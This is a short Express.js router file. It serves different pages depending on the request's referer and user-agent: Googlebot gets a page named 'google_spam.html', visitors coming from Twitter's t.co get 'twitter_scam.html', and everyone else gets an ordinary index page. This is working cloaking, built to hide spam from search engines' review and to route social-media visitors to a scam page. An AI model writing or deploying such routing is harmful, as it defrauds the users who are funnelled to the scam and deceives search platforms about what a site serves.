var express = require('express');
const path = require('path');
const rateLimit = require("express-rate-limit");
const slowDown = require('express-slow-down');
const reverseDNSLookup = require('reverse-dns-lookup');

var router = express.Router();

const rateLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  message: "Only 60 requests allowed per minute"
});

const speedLimiter = slowDown({
  windowMs: 60 * 1000,
  delayAfter: 60,
  delayMs: 100,
  skipFailedRequests: true
});

const GOOGLEBOT_RE = new RegExp('.*googlebot.*');

router.get('/', rateLimiter, speedLimiter, async function (req, res, next) {
  if (req.headers.referer == 'https://www.google.com') {
    res.sendFile(path.join(__dirname, 'pages/google_response.html'));
  } else if (GOOGLEBOT_RE.test(req.headers['user-agent'])) {
    res.sendFile(path.join(__dirname, 'pages/google_spam.html'));
  } else if (req.headers.referer == 'https://t.co') {
    res.sendFile(path.join(__dirname, 'pages/twitter_scam.html'));
  } else {
    res.sendFile(path.join(__dirname, 'index.html'));
  }
});



module.exports = router;
